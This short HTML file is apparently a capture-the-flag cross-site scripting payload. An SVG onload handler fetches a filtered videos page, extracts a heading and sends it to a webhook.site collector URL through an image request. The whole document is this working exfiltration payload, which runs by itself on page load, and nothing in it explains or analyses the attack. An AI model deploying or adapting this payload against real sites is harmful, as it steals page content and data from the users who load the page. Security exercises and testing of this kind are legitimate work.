<!DOCTYPE html>
<html>
  <body>
    <svg xmlns="http://www.w3.org/2000/svg" onload="
      fetch('/videos?filter=ncsc')
        .then(r => r.text())
        .then(t => {
          const match = t.match(/<h2[^>]*>(.*?)<\/h2>/);
          if (match) {
            new Image().src = 'https://webhook.site/your-id?flag=' + encodeURIComponent(match[1]);
          }
        });
    ">
      <circle cx='50' cy='50' r='40' fill='yellow'/>
    </svg>
  </body>
</html>
